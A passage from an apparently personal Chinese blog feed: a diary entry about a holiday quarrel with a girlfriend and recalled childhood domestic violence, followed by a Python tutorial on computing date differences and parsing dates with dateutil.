，攻击者的更新速度很快，从漏洞利用被报出，到发动僵尸主机攻击，仅仅7天时间，这在之前是从来没有见过的。所以整个一周，都在整理材料，准备发文章叙述这次事件，展示我们的能力。我需要和僵尸网络赛跑，我需要和同行赛跑，因为<strong>首发</strong>，太重要了，一旦有其他团队发声，你一周的努力就完全白费了。当然啦，一周的加班也让人身心俱疲，<strong>清明假期，我其实只想好好休息。</strong></p></blockquote><p>我和冯冯两个多月没见了，按理来说应该是挺期待的，我想，这次见面，就是很普通的见面，好好聊聊近况，看几个电影、几个综艺笑一笑，阳光正好出去走一走，短短的假期就过去了，应该是很开心，很甜蜜的。我背上海底捞自热火锅和娃哈哈，虽然身体和心理上被一周的加班折腾的有些疲惫，但幻想两个人围在餐桌前吃着火锅，喝着娃哈哈四目相对的样子，多温馨呀。事实上也是，两个多月没见，冯冯说话轻声细语的，一切似乎都没变，似乎也有一些变化。</p><p>后来呢，假期的第一天，中午冯冯要给我做排骨吃，那当然很开心呀，请你吃一顿饭和给你做一顿饭，是不一样的。中途，我查到了小龙虾发货了，这可咋办？改地址吧，反正清明假期要一直和冯冯待在一起的。改好了地址，说起来是冯冯给我做排骨吃，实际上我的神经是紧绷的，能让你白吃嘛？能是女票做饭，你洗碗那么简单吗？所以还是勤快些吧，即使是在她家，即使你对她家里的什么东西都不熟悉，即使你对她做饭的流程完全不清楚，她让你做什么就做什么呗。结果呢，就是因为这一顿饭，所有的情绪都爆发了。加班休息不好，满脸的痘痘更加严重了，整个人满脑子工作，牙膏糊在了衣服上，洗碗慢悠悠，溅的到处是水，洗过一遍的菜放到了放过肉的盆子里，洗碗菜水太凉，多嘴问一句“水凉吗？”，总之吧，整个做饭的过程，我站着也不是，坐着也不是。说话也不是，不说话也不是。做事也不是，不做事也不是。对，冯冯发脾气了。</p><p>我不知道冯冯哪里来的怨念，我觉得如果是约别人吃饭，给别人做东西吃，别人本身就是客人，客人不帮是本分，客人帮忙做东西，是客人有修养，客人做的不好，是不熟悉你家里的设施，都是正常的。如果是小两口同居，那做饭本身就是两个人沟通感情的一件事，做得好吃不好吃，过程顺利不顺利，都不重要，重要的是两个人一起做了一件事。我不知道冯冯为什么整个过程如此嫌弃，<strong>我猜，也许在冯冯的视角里，这个男生，自己都照顾不好自己，做事情笨手笨脚，不会做事情也不会哄人，完全就很幼稚，担不起一个家庭，作为一个丈夫，作为一个父亲的责任。</strong>可能是这样吧。</p><blockquote><p>从午饭开始，一直到下午5点，冯冯中午休息了一会，冯冯一直在用各种理由数落我，<strong>那种感觉，就像把你按在水里，</strong>我后来想起来，就是春节的时候，家里的亲戚说父亲，本来挺高兴的节日，说的两家子人都不欢而散，父亲说：“你不知道她那个嘴脸，恨不得把牙掏出来说你，说你吃了她东西了，说你光吃不帮忙做事了。我TM过个年，带着钱，开着车来，几天时间一万块钱出去了，就为了吃你这一顿饭吗？你什么饭啊这么贵？就光说这个事儿还不够，还要陈芝麻烂谷子的事都要拿出来说，我是没有工作吗？我靠你们家养着吗？真是太可恶了，怎么坐的住。”</p><p>没错，冯冯数落我的时候，我和父亲当时的感受是一样的，我觉得我哪都不对，虽然我知道，可能自己做事不满足冯冯的预期，但是我也说了，我承认我做的不好，但是给我时间，我一点一点来，肯定会做好的。就是不行，就是要把牙掏出来骂你。冯冯说：“我和我同学做个饭就挺开心的，但是每次和你都气呼呼的。”我当时真的好想说：“那你跟你的同学去过吧，我不适合你。”</p><p>后来呢，我是在是给骂的受不了了，本身身心就很疲惫，清明假期想开开心心的，合着我背着礼物、吃的喝的，过来就是挨骂的，我也是靠你们家养着吗？这是在给我家打扫卫生做家务吗？<strong>父亲后来回宾馆了，再不去亲戚家了，我也找了个借口，回家了。</strong>当时，手机只剩百分之十的电了，我知道，路上手机肯定会没电，我可能要步行6公里从地铁站走到小区，我可能进不了小区门。<strong>但是真的，我当时只有一个念头，求求了，让我离开这个地方吧，我真的受不了了。没电就没电，不管怎么样，哪怕步行60公里，能离开这个地方，我也愿意。</strong></p><p>最后，平时需要一个多小时的路程，我花了两倍的时间，到家整个人头昏脑涨的，冯冯发微信说想和我聊聊，你才怎么着，电视机的声音很大，听不清在说什么，上来沉默了10秒，“你为什么又不说话？我最讨厌你不说话的时候了！”，我当时真的，我好想把电话直接按掉。</p></blockquote><p>所以才有了开头的那一段，我接到了快递的电话，小龙虾到了她家门口，我解锁了手机，本来想拨通她的电话，后来想了想，拨通了顺丰的电话，我要求转寄。但是第二天，没有转寄成功，还是在她家门口，我没有丝毫犹豫，我自己去取吧，只要能别见到她，别听到她的声音。</p><h1 id="有什么果呢？"><a href="#有什么果呢？" class="headerlink" title="有什么果呢？"></a>有什么果呢？</h1><p>整个清明假期，我都很恐惧，我恐惧她又要给我打电话，又要骂我，又要问我为什么不说话，我真的对她没什么好说的了。我恐惧我那没收到的几盒小龙虾，我要打电话让她帮我收货，我要去见她取回来，我怕见到她，她又要骂我，又要问我，你为什么不说话。</p><blockquote><p>“给我起来！”我从睡梦中惊醒，有什么在拍我的头。“你这个作业怎么做的？这么简单不会吗？怎么不说话？我问你呢？这个题，答案是什么？你今天做不出来，你就别睡觉了，来，耗着吧。”我印象里，是穿着毛裤的小腿和光着的脚，一开始还有温度，逐渐的感觉到凌晨的寒意阵阵袭来，后来甚至于到了几点，怎么睡着的，我都不记得了。</p><p>我记得脑袋嗡的一声，然后眼前一白，过了许久，才逐渐能看清楚东西，我回想过来，是父亲随手抄起垃圾桶，砸向我的头，粉碎的垃圾桶划破了我的脸，我甚至还没感觉到疼。为什么？因为午饭的时候，我说我不喜欢吃那个东西，我之前也说过我不喜欢吃那个东西。然后没有给我反应的时间，就是飞来的垃圾桶。</p><p>“这个春节，你爱怎么过怎么过吧，大过节的，摆个臭脸给谁看呢？你有本事，自己回去陪老人啊？你臭脸摆给你妈看啊？”紧接着，我看到他拿着菜刀从厨房里面冲出来，母亲见状一把护住我，他连通母亲和怀里的我一起打，我嘶吼着，我眼睛看不见了，带我去医院，妈妈，这个春节哪儿也去不了了。</p></blockquote><p>我的父亲一直是一个不会控制自己情绪的人，或者说，整个家族里面，父系的亲人都不会控制自己的情绪，爷爷去世，也是因为和别人发生了冲突，本来身体很硬朗。所以<strong>，我从小面对那些争吵，就只会选择沉默</strong>，冲突会让双方动手，我还小，永远是我受伤。任由他发火，任由他发疯，我当听不见就行了，他自己气一会儿，自己就好了。我打心底里看不起那些控制不了自己情绪的人，连自己的情绪都控制不住，你还能控制住什么？<strong>我希望自己能始终温文尔雅的，不会脸红脖子粗的破口大骂，那是街上的泼妇干的事儿。我真的，好害怕，自己的家庭，未来还会遭受无尽的争吵。</strong></p><p>所以，冯冯冲我发火，<strong>唤起了我心底里面已经快忘记的那份恐惧</strong>，那份恐惧从我离开家，就消失了，我不用再忍受父亲的脾气了，我长大了，即使动手我也不害怕了。但是，这个清明节，挨骂的我，真的好无助，就和当初躲在麻麻怀里，望着拿刀冲过来的他一样，那些噩梦一样的记忆一下子就都又涌现出来了。<strong>我真的无法想象，这样的一个姑娘，一点不和她意，怎么哄都没有用，道歉没有用，说以后改没有用，就要指着鼻子骂你，骂到她痛快了为止。我真的好害怕，我好害怕那种争吵的气氛。只是做饭这样一件小事就能这样，如果出了别的事，不符合她意，会是怎么样，砸东西吗？拿刀吗？我的孩子，也要经历我童年的那段灰暗吗？</strong></p><p>所以，清明节，看着手机没有微信消息，没有未接来电，我好解脱。但是我真的又好害怕，我害怕手机突然震动，她联系我了。</p><h1 id="我想说什么呢"><a href="#我想说什么呢" class="headerlink" title="我想说什么呢"></a>我想说什么呢</h1><h2 id="我接受不了一个自私的另一半"><a href="#我接受不了一个自私的另一半" class="headerlink" title="我接受不了一个自私的另一半"></a>我接受不了一个自私的另一半</h2><p>90后是被溺爱的一代，因为很多孩子都是独生子女，两个大人，四个老人，就这么一个宝贝疙瘩，那还不宠着惯着？我很庆幸我的家族，虽然给我经历过一些灰暗，但是也学到了很多收益的东西。比如不能太自私，应该先为别人着想。这在90后这一代里面，太宝贵了。你能想象，一堆情侣，一个人总是为另一个人考虑，而另一个人别受煎熬，你别对我这么好，你自私一点好不好。这是一番什么场景吗？</p><h2 id="男生后来总会承担起相应的责任的"><a href="#男生后来总会承担起相应的责任的" class="headerlink" title="男生后来总会承担起相应的责任的"></a>男生后来总会承担起相应的责任的</h2><p>我从小生活就是只有学习。我第一年高考，只考上了二本，父母觉得我丢了他们的脸，成绩出来的那一个晚上，父母什么话都没有说，出去了。我自己一个人在家里，真的好害怕，我不知道自己做错了什么，我就是这样，我只能考这么高的成绩，我有什么错。</p><p>后来，一年复读，每天1点之后睡觉，印象里是白色的马克杯，飘着热气的咖啡，紫色和红色的五三，以及拿到成绩单，无忧无虑的夏天。</p><p>再后来，大学，工作。我离开了原来那个家，我试着自己一个人生活，事实上还好，虽然生活懒散，但是偶尔兴致来了，收拾收拾房子，打扫打扫卫生，自己买些菜，煮个啥菜啥肉都有的面条，日子还是挺开心的。每天洗一次澡，半个月换一次床单，只喝怡宝不喝自来水，自己一个人也挺好。</p><p>也许对我而言，小时候，唯一的任务就是学习，角色是一个小朋友，考一个一本就够了。上了大学，唯一的任务就是学习，角色是青年，找一份好工作就够了。参加工作以后，任务是工作、学习、找对象，角色是成年人，干好工作、充实自己、陪伴女票就够了。结婚以后，任务是顶住这个家，角色是丈夫、父亲，那要承担的就更多了。但是，我们不就是这样一步一步的过来的吗？我想，我最不担心的就是自己的自学能力了，这也是我获得目前这份工作，获得目前一切的原因。<strong>一个男生，只要是需要，有另一半的陪伴，两个人一起成长，一定可以完成角色的转变。</strong></p><h2 id="我接受不了一个易怒的另一半"><a href="#我接受不了一个易怒的另一半" class="headerlink" title="我接受不了一个易怒的另一半"></a>我接受不了一个易怒的另一半</h2><p>我后来名表了，一个人的脾气，是基因里面带的，有些人可能真的控制不了他们的情绪。我受够了父亲的坏脾气，我从小忍耐，自己早已不善于喜怒形于色了。我希望我自己温文尔雅的，我也希望我的另一半能够温文尔雅的。我还希望我的丈母娘，我的老丈人都是知识分子，都是温文尔雅的。从此再不会有无休止的争吵，我的孩子不会经历我有过的恐惧了。</p><h1 id="最后呢"><a href="#最后呢" class="headerlink" title="最后呢"></a>最后呢</h1><p>母亲来电话了：</p><blockquote><p> “怎么样呀？清明节你们小两口开心吗？”</p><p>“嗯，开心，好着呢，你别问啦！”</p><p>“做了什么吃呀？去哪玩了呀？”</p><p>“你怎么跟查水表一样，什么都问哦，好着呢！”</p></blockquote><p>明天就要上班了，零零散散的，也不知道自己说了些什么，今天看了医生，结膜炎一周了，怕出问题，结论是干眼症和结膜炎。测了视力，没有太大变化，做了着色，医生说黑眼球周围有一些着色，看得出来感染，但是视神经是好的，没有问题，也算是送了一口气。但是这段时间确实感觉看东西有些吃力，可能工作的原因整天看电脑，加上结膜炎还是有影响吧。</p><p>我也不知道未来该怎么办，我的内心告诉我，离她远一点吧，她不是第一次对你发脾气了，你不是第一次不知道怎么哄她了，她变不了的，你这一次能躲回家，未来呢，还要多出去吗？自己偷偷睡公司，然后对父母说没事，晚上加班？还是跑派出所，我酒驾了，求求你抓我进去，我不想见我老婆。你也配不上她，她说的没错，她的条件很好，能找到工作、性格、生活方式、社会资源地位各方面都比你成熟的人，你现在粘着她，未来总有一天，她还是会觉得自己吃亏了，还是会有争吵的。但是，父母很希望我维护好这段感情，但是，其中的煎熬只有我自己知道。</p><p>加油吧，让自己忙起来，也许就忘记了。至于其他的，以后再说吧。</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python计算日期相差几年几月几日</title>
    <link href="/posts/7bb972e7.html"/>
    <url>/posts/7bb972e7.html</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>如何计算日期间隔的年份月份呢？之前写了一个程序，使用<code>datetime</code>计算和女票在一起多少天了，但是最近遇到了一个问题，随着时间的增长，我们需要计算日期间隔的年月日，毕竟1265天是几年呢？本来打算自己写一个，结果发现计算平年闰年，计算每个月多少天，真的是一个非常麻烦的事。于是面向搜索google，我发现中文根本搜不出来任何结果，最终借助google翻译，用英文瞎打误撞发现了<code>dateutil</code>这个模块非常好用。</p><h1 id="计算日期间隔的年月日"><a href="#计算日期间隔的年月日" class="headerlink" title="计算日期间隔的年月日"></a>计算日期间隔的年月日</h1><p><code>datetime</code>只能计算日期间隔了多少天，而<code>dateutil</code>则可以计算日期间隔了几年几月几日。</p><h2 id="使用datetime"><a href="#使用datetime" class="headerlink" title="使用datetime"></a>使用datetime</h2><p>我在一开始使用了<code>datetime</code>，但是<code>datetime</code>模块只能计算天数，过程如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>Type <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;license&#x27;</span> <span class="hljs-keyword">for</span> more information<br>IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span> -- An enhanced Interactive Python. Type <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> help.<br>PyDev console: using IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span><br><br>Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>[GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">6.0</span> (clang<span class="hljs-number">-600.0</span><span class="hljs-number">.57</span>)] on darwin<br>In[<span class="hljs-number">2</span>]: <span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> date<br>In[<span class="hljs-number">3</span>]: today = date.today()<br>In[<span class="hljs-number">4</span>]: date_first_chat = date(<span class="hljs-number">2019</span>, <span class="hljs-number">2</span>, <span class="hljs-number">21</span>)<br>In[<span class="hljs-number">5</span>]: (today - date_first_chat).days<br>Out[<span class="hljs-number">5</span>]: <span class="hljs-number">390</span><br>In[<span class="hljs-number">6</span>]: (today - date_first_chat).months<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/Users/scarleast/PycharmProjects/weahter_forecast/venv/lib/python3.6/site-packages/IPython/core/interactiveshell.py&quot;</span>, line <span class="hljs-number">3331</span>, <span class="hljs-keyword">in</span> run_code<br>    exec(code_obj, self.user_global_ns, self.user_ns)<br>  File <span class="hljs-string">&quot;&lt;ipython-input-6-2de9a8b2ecb1&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    (today - date_first_chat).months<br>AttributeError: <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span> object has no attribute <span class="hljs-string">&#x27;months&#x27;</span><br>In[<span class="hljs-number">7</span>]: (today - date_first_chat).years<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;/Users/scarleast/PycharmProjects/weahter_forecast/venv/lib/python3.6/site-packages/IPython/core/interactiveshell.py&quot;</span>, line <span class="hljs-number">3331</span>, <span class="hljs-keyword">in</span> run_code<br>    exec(code_obj, self.user_global_ns, self.user_ns)<br>  File <span class="hljs-string">&quot;&lt;ipython-input-7-2cf9a3422a44&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    (today - date_first_chat).years<br>AttributeError: <span class="hljs-string">&#x27;datetime.timedelta&#x27;</span> object has no attribute <span class="hljs-string">&#x27;years&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="使用dateutil"><a href="#使用dateutil" class="headerlink" title="使用dateutil"></a>使用dateutil</h2><p>使用<code>dateutil</code>可以计算出日期相隔的年月日：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>Type <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;license&#x27;</span> <span class="hljs-keyword">for</span> more information<br>IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span> -- An enhanced Interactive Python. Type <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> help.<br>PyDev console: using IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span><br><br>Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>[GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">6.0</span> (clang<span class="hljs-number">-600.0</span><span class="hljs-number">.57</span>)] on darwin<br>In[<span class="hljs-number">2</span>]: <span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> date<br>In[<span class="hljs-number">3</span>]: <span class="hljs-keyword">from</span> dateutil.relativedelta <span class="hljs-keyword">import</span> relativedelta<br>In[<span class="hljs-number">4</span>]: today = date.today()<br>In[<span class="hljs-number">5</span>]: date_first_chat = date(<span class="hljs-number">2019</span>, <span class="hljs-number">2</span>, <span class="hljs-number">21</span>)<br>In[<span class="hljs-number">6</span>]: diff = relativedelta(today, date_first_chat)<br>In[<span class="hljs-number">7</span>]: diff.years<br>Out[<span class="hljs-number">7</span>]: <span class="hljs-number">1</span><br>In[<span class="hljs-number">8</span>]: diff.months<br>Out[<span class="hljs-number">8</span>]: <span class="hljs-number">0</span><br>In[<span class="hljs-number">9</span>]: diff.days<br>Out[<span class="hljs-number">9</span>]: <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><h1 id="从字符串中解析时间"><a href="#从字符串中解析时间" class="headerlink" title="从字符串中解析时间"></a>从字符串中解析时间</h1><p><code>datetime</code>模块解析一个时间字符串非常复杂（需要自己写日期的格式规则），而<code>dateutil</code>则非常简单（不需要加一长串规则）。</p><h2 id="使用datetime-1"><a href="#使用datetime-1" class="headerlink" title="使用datetime"></a>使用datetime</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>Type <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;license&#x27;</span> <span class="hljs-keyword">for</span> more information<br>IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span> -- An enhanced Interactive Python. Type <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> help.<br>PyDev console: using IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span><br><br>Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>[GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">6.0</span> (clang<span class="hljs-number">-600.0</span><span class="hljs-number">.57</span>)] on darwin<br>In[<span class="hljs-number">2</span>]: log_line = <span class="hljs-string">&quot;INFO 2014-07-01T23:00:51 chat bot shutdown.&quot;</span><br>In[<span class="hljs-number">3</span>]: date_str = <span class="hljs-string">&quot;%Y-%m-%dT%H:%M:%S&quot;</span><br>In[<span class="hljs-number">4</span>]: <span class="hljs-keyword">import</span> datetime<br>In[<span class="hljs-number">5</span>]: datetime.datetime.strptime(log_line.split()[<span class="hljs-number">1</span>], date_str)<br>Out[<span class="hljs-number">5</span>]: datetime.datetime(<span class="hljs-number">2014</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">23</span>, <span class="hljs-number">0</span>, <span class="hljs-number">51</span>)<br></code></pre></td></tr></table></figure><h2 id="使用dateutil-1"><a href="#使用dateutil-1" class="headerlink" title="使用dateutil"></a>使用dateutil</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>Type <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;license&#x27;</span> <span class="hljs-keyword">for</span> more information<br>IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span> -- An enhanced Interactive Python. Type <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> help.<br>PyDev console: using IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span><br><br>Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>[GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">6.0</span> (clang<span class="hljs-number">-600.0</span><span class="hljs-number">.57</span>)] on darwin<br>In[<span class="hljs-number">2</span>]: log_line = <span class="hljs-string">&quot;INFO 2014-07-01T23:00:51 chat bot shutdown.&quot;</span><br>In[<span class="hljs-number">3</span>]: <span class="hljs-keyword">from</span> dateutil.parser <span class="hljs-keyword">import</span> parse<br>In[<span class="hljs-number">4</span>]: timestamp = parse(log_line, fuzzy=<span class="hljs-literal">True</span>)<br>In[<span class="hljs-number">5</span>]: print(timestamp)<br><span class="hljs-number">2014</span><span class="hljs-number">-07</span><span class="hljs-number">-01</span> <span class="hljs-number">23</span>:<span class="hljs-number">00</span>:<span class="hljs-number">51</span><br></code></pre></td></tr></table></figure><h1 id="计算时间列表"><a href="#计算时间列表" class="headerlink" title="计算时间列表"></a>计算时间列表</h1><p>试想一下，今天是星期二，如果从今天开始往后10周，每周星期二我都需要听一节课，怎么计算我听课的日期？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>Type <span class="hljs-string">&#x27;copyright&#x27;</span>, <span class="hljs-string">&#x27;credits&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;license&#x27;</span> <span class="hljs-keyword">for</span> more information<br>IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span> -- An enhanced Interactive Python. Type <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> help.<br>PyDev console: using IPython <span class="hljs-number">7.13</span><span class="hljs-number">.0</span><br><br>Python <span class="hljs-number">3.6</span><span class="hljs-number">.6</span> (v3<span class="hljs-number">.6</span><span class="hljs-number">.6</span>:<span class="hljs-number">4</span>cf1f54eb7, Jun <span class="hljs-number">26</span> <span class="hljs-number">2018</span>, <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">54</span>) <br>[GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">6.0</span> (clang<span class="hljs-number">-600.0</span><span class="hljs-number">.57</span>)] on darwin<br>In[<span class="hljs-number">2</span>]: <span class="hljs-keyword">from</span> dateutil.rrule <span class="hljs-keyword">import</span> rrule, WEEKLY<br>In[<span class="hljs-number">3</span>]: <span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> date<br>In[<span class="hljs-number">4</span>]: <span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br>In[<span class="hljs-number">5</span>]: today = date.today()<br>In[<span class="hljs-number">6</span>]: pprint(list(rrule(WEEKLY, count=<span class="hljs-number">10</span>, dtstart=today)))<br>[datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">3</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">3</span>, <span class="hljs-number">31</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">4</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">4</span>, <span class="hljs-number">21</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">4</span>, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br> datetime.datetime(<span class="hljs-number">2020</span>, <span class="hljs-number">5</span>, <span class="hljs-number">19</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)]<br></code></pre></td></tr></table></figure><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>个人还是特别喜欢<code>dateutil</code>解析时间和计算日期间隔年月日的功能，真的省了我太多事了。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>python</category>
      
